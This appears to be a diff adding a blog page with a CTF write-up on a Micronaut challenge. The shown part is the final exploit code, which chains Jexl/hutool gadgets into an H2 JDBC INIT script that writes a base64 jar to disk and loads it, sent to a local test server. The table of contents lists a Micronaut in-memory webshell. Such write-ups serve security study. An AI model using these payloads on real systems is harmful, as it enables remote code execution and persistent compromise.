+        String loadClassPoc = &quot;[n='cn.hutool.db.ds.pooled.PooledDataSource',d=new('cn.hutool.db.ds.pooled.PooledDataSource',new('cn.hutool.db.ds.pooled.DbConfig','jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS IF NOT EXISTS LOAD_JAR AS \\'void loadJar(String jarPath, String className, String methodName) throws Exception {java.net.URL jarUrl = new java.net.URL(\\\&quot;file:\\\&quot; + jarPath)\\;java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{jarUrl})\\;Class&lt;?&gt; loadedClass = classLoader.loadClass(className)\\;Object instance = loadedClass.getDeclaredConstructor().newInstance()\\;java.lang.reflect.Method method = loadedClass.getMethod(methodName)\\;method.invoke(instance)\\;}\\'\\;CALL LOAD_JAR(\\'&quot; + loadClassPath + &quot;\\', \\'&quot; + loadClassName + &quot;\\', \\'&quot; + loadClassMethodName + &quot;\\')\\;','1111','111')),u='cn.hutool.db.ds.pooled.PooledConnection']&quot;;
+
+        String jar2base64Path = &quot;/Users/a1234/data/codes/java/micronaut-poc/target/original-micronaut-poc-0.1.jar&quot;;
+        String jar2base64 = jar2base64(jar2base64Path);
+        String writeJarPoc = &quot;[n='cn.hutool.db.ds.pooled.PooledDataSource',d=new('cn.hutool.db.ds.pooled.PooledDataSource',new('cn.hutool.db.ds.pooled.DbConfig','jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS IF NOT EXISTS BASE64_TO_JAR AS \\'void base64ToJar(String base64Data, String filePath) throws java.io.IOException {byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data)\\;try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) {fos.write(jarBytes)\\;}}\\'\\;CALL BASE64_TO_JAR (\\'&quot; + jar2base64 + &quot;\\',\\'&quot; + loadClassPath + &quot;\\')\\;','1111','111')),u='cn.hutool.db.ds.pooled.PooledConnection']&quot;;
+        
+        Gson gson = new GsonBuilder()
+                .create();
+
+        BeanUtil beanUtil = new BeanUtil();
+        beanUtil.setUrl(&quot;http&quot;);
+        String json = gson.toJson(beanUtil, BeanUtil.class);
+        System.out.println(json);
+
+        String poc1 = Base64.getEncoder().encodeToString(json.getBytes()) + &quot;&lt;---&gt;&quot; + writeJarPoc + &quot;&lt;---&gt;&quot; + &quot;admin&quot;;
+        String poc2 = Base64.getEncoder().encodeToString(json.getBytes()) + &quot;&lt;---&gt;&quot; + loadClassPoc + &quot;&lt;---&gt;&quot; + &quot;admin&quot;;
+
+        User poc1User = new User(&quot;admin&quot;, &quot;1&quot;, Base64.getEncoder().encodeToString(poc1.getBytes()));
+        User poc2User = new User(&quot;admin&quot;, &quot;1&quot;, Base64.getEncoder().encodeToString(poc2.getBytes()));
+
+        ObjectMapper objectMapper = new ObjectMapper();
+
+        System.out.println(objectMapper.writeValueAsString(poc1User));
+        System.out.println(&quot;send1&quot;);
+        sendPostRequest(&quot;http://127.0.0.1:8080&quot;, &quot;/hello/user&quot;, objectMapper.writeValueAsString(poc1User));
+        System.out.println(&quot;send2&quot;);
+        sendPostRequest(&quot;http://127.0.0.1:8080&quot;, &quot;/hello/user&quot;, objectMapper.writeValueAsString(poc2User));
+    }
+
+    public static String jar2base64(String jarPath) {
+        File jarFile = new File(jarPath);
+        try (FileInputStream fis = new FileInputStream(jarFile)) {
+            byte[] jarBytes = new byte[(int) jarFile.length()];
+            fis.read(jarBytes);
+            return Base64.getEncoder().encodeToString(jarBytes);
+        } catch (IOException e) {
+            e.printStackTrace();
+            return &quot;&quot;;
+        }
+    }
+
+    public static String sendGetRequest(String url, String endpoint) {
+        try (HttpClient httpClient = HttpClient.create(new URL(url))) {
+            HttpRequest&lt;String&gt; request = HttpRequest.GET(endpoint);
+            HttpResponse&lt;String&gt; response = httpClient.toBlocking().exchange(request, String.class);
+            return response.body();
+        } catch (Exception e) {
+            return &quot;Error: &quot; + e.getMessage();
+        }
+    }
+
+    public static String sendPostRequest(String url, String endpoint, String data) {
+        try (HttpClient httpClient = HttpClient.create(new URL(url))) {
+            HttpRequest&lt;String&gt; request = HttpRequest.POST(endpoint, data)
+                    .contentType(MediaType.APPLICATION_JSON); // 设置 Content-Type 头
+            HttpResponse&lt;String&gt; response = httpClient.toBlocking().exchange(request, String.class);
+            return response.body();
+        } catch (Exception e) {
+            return &quot;Error: &quot; + e.getMessage();
+        }
+    }
+}
+
+</code></pre>
+
+        </div>
+        <!-- Share to Twitter, Weibo, Telegram -->
+        <div class="flex items-center">
+          <div class="mr-4 flex items-center">
+            <i class="ri-share-forward-line text-gray-500"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-blue-500 hover:bg-blue-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTwitter">
+            <i class="ri-twitter-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-red-500 hover:bg-red-100 dark:hover:bg-gray-600 inline-flex" @click="shareToWeibo">
+            <i class="ri-weibo-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-indigo-500 hover:bg-indigo-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTelegram">
+            <i class="ri-telegram-line"></i>
+          </div>
+        </div>
+      </div>
+
+      
+
+      
+        <div id="vlaine-comment"></div>
+      
+
+      <footer class="py-12 text-center px-4 md:px-0" v-pre>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+</footer>
+    </div>
+
+    <!-- TOC Container -->
+    <div class="fixed right-0 bottom-0 mb-16 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white dark:bg-gray-500 dark:text-gray-200 hover:shadow-lg transition-all animated fadeInRight" @click="showToc = true">
+      <i class="ri-file-list-line"></i>
+    </div>
+
+    <div class="fixed right-0 top-0 bottom-0 overflow-y-auto w-64 bg-white dark:bg-gray-800 p-4 border-l border-gray-100 dark:border-gray-600 z-10 transition-fast" :class="{ '-mr-64': !showToc }">
+      <div class="flex mb-4 justify-end">
+        <div class="w-8 h-8 inline-flex justify-center items-center rounded-full cursor-pointer hover:bg-gray-200 dark:hover:bg-gray-600 transition-fast" @click="showToc = false">
+          <i class="ri-close-line text-lg"></i>
+        </div>
+      </div>
+      <div class="post-toc-container">
+        <ul class="markdownIt-TOC">
+<li><a href="#su_ez_solon">SU_ez_solon</a></li>
+<li><a href="#su_ez_micronaut">SU_ez_micronaut</a>
+<ul>
+<li><a href="#0x01-micronaut-%E5%BA%8F%E5%88%97%E5%8C%96%E7%89%B9%E6%80%A7">0x01 micronaut 序列化特性</a></li>
+<li><a href="#0x02-jexl-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BB%BB%E6%84%8Fgetter-setter%E8%B0%83%E7%94%A8">0x02 Jexl 表达式任意getter、setter调用</a>
+<ul>
+<li><a href="#poc">poc</a></li>
+<li><a href="#debug%E8%B0%83%E8%AF%95">debug调试</a></li>
+<li><a href="#%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6">深入研究</a></li>
+<li><a href="#%E4%BB%BB%E6%84%8Fsetter%E8%B0%83%E7%94%A8">任意setter调用</a></li>
+</ul>
+</li>
+<li><a href="#0x03-h2-jdbc-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">0x03 h2 jdbc 任意代码执行</a></li>
+<li><a href="#0x04-micronaut-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%A2%E7%B4%A2">0x04 micronaut 内存马探索</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96context%E4%B8%8A%E4%B8%8B%E6%96%87">获取context上下文</a></li>
+<li><a href="#filter-%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">filter 注册流程分析</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5filter%E5%86%85%E5%AD%98%E9%A9%AC">注入filter内存马</a></li>
+<li><a href="#%E6%95%88%E6%9E%9C%E5%B1%95%E7%A4%BA">效果展示</a></li>
+</ul>
+</li>
+<li><a href="#0x05-h2-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%B3%A8%E5%85%A5micronaut%E5%86%85%E5%AD%98%E9%A9%AC">0x05 h2 任意代码执行注入micronaut内存马</a></li>
+<li><a href="#0x06-%E6%9C%80%E7%BB%88exp">0x06 最终exp</a></li>
+</ul>
+</li>
+</ul>
+
+      </div>
+    </div>
+
+    <!-- Back to top -->
+    <div class="fixed right-0 bottom-0 mb-4 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white hover:shadow-lg transition-all dark:bg-gray-500 dark:text-gray-200" @click="backToUp" v-show="scrolled">
+      <i class="ri-arrow-up-line"></i>
+    </div>
+  </div>
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <!-- Background of PhotoSwipe. 
+        It's a separate element as animating opacity is faster than rgba(). -->
+  <div class="pswp__bg">
+  </div>
+  <!-- Slides wrapper with overflow:hidden. -->
+  <div class="pswp__scroll-wrap">
+    <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+    <div class="pswp__container">
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+    </div>
+    <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <!--  Controls are self-explanatory. Order can be changed. -->
+        <div class="pswp__counter">
+        </div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+        <!-- element will get class pswp__preloader--active when preloader is running -->
+        <div class="pswp__preloader">
+          <div class="pswp__preloader__icn">
+            <div class="pswp__preloader__cut">
+              <div class="pswp__preloader__donut">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip">
+        </div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://yulate.github.io/media/scripts/main.js"></script>
+  
+  <!-- Code Highlight -->
+  
+    <script src="https://yulate.github.io/media/prism.js"></script>
+    <script>
+      Prism.highlightAll()
+    </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+  <script>
+    //拿到预览框架，也就是上面的html代码
+    var pswpElement = document.querySelectorAll('.pswp')[0];
+    //定义图片数组变量
+    var imgitems;
+    /**
+    * 用于显示预览界面
+    * @param index 图片数组下标
+    */
+    function viewImg(index) {
+      //其它选项这里不做过多阐述，详情见官网
+      var pswpoptions = {
+        index: parseInt(index, 10), // 开始幻灯片索引。0是第一张幻灯片。必须是整数，而不是字符串。
+        bgOpacity: 0.7, // 背景透明度，0-1
+        maxSpreadZoom: 3, // 缩放级别，不要太大
+      };
+      //初始化并打开PhotoSwipe，pswpElement对应上面预览框架，PhotoSwipeUI_Default为皮肤，imgitems为图片数组，pswpoptions为选项
+      var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, imgitems, pswpoptions);
+      gallery.init()
+    }
+    /**
+    * 用于添加图片点击事件
+    * @param img 图片元素
+    * @param index 所属下标（在imgitems中的位置）
+    */
+    function addImgClick(img, index) {
+      img.onclick = function() {
+        viewImg(index)
+      }
+    }
+    /**
+    * 轮询所有图片，获取src、width、height等数据，加入imgitems，并给图片元素添加事件
+    * 最好在onload中执行该方法，本站因放在最底部，所以直接初始化
+    * 异步加载图片可在图片元素创建完成后调用此方法
+    */
+    function initImg() {
+      //重置图片数组
+      imgitems = [];
+      //查找class:markdown 下的所有img元素并遍历
+      var imgs = document.querySelectorAll('.markdown img');
+      for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        //本站相册初始为loading图片，真实图片放在data-src
+        var ds = img.getAttribute("data-src");
+        //创建image对象，用于获取图片宽高
+        var imgtemp = new Image();
+        //判断是否存在data-src
+        if (ds != null && ds.length > 0) {
+          imgtemp.src = ds
+        } else {
+          imgtemp.src = img.src
+        }
+        //判断是否存在缓存
+        if (imgtemp.complete) {
+          var imgobj = {
+            "src": imgtemp.src,
+            "w": imgtemp.width,
+            "h": imgtemp.height,
+          };
+          imgitems[i] = imgobj;
+          addImgClick(img, i);
+        } else {
+          console.log('进来了2')
+          imgtemp.index = i;
+          imgtemp.img = img;
+          imgtemp.onload = function() {
+            var imgobj = {
+              "src": this.src,
+              "w": this.width,
+              "h": this.height,
+            };
+            //不要使用push，因为onload前后顺序会不同
+            imgitems[this.index] = imgobj
+            //添加点击事件
+            addImgClick(this.img, this.index);
+          }
+        }
+      }
+    }
+    //初始化
+    initImg();
+  </script>
+  
+    <script type="application/javascript" src="https://unpkg.com/valine"></script>
+<script type="application/javascript">
+  new Valine({
+    el: '#vlaine-comment',
+    appId: '2TlPRQUYNcF2YZZrESw4Ixr8-gzGzoHsz',
+    appKey: 'pRAtmeZWCUzNZ3MHKwdY9Igk',
+    pageSize: 10,
+    notify: true,
+    avatar: 'mp',
+    verify: true,
+    placeholder: '来都来了，不妨评论一下',
+    visitor: true,
+    highlight: false,
+    recordIP: true,
+  })
+</script>
+  
+  
+</body>
+
+</html>
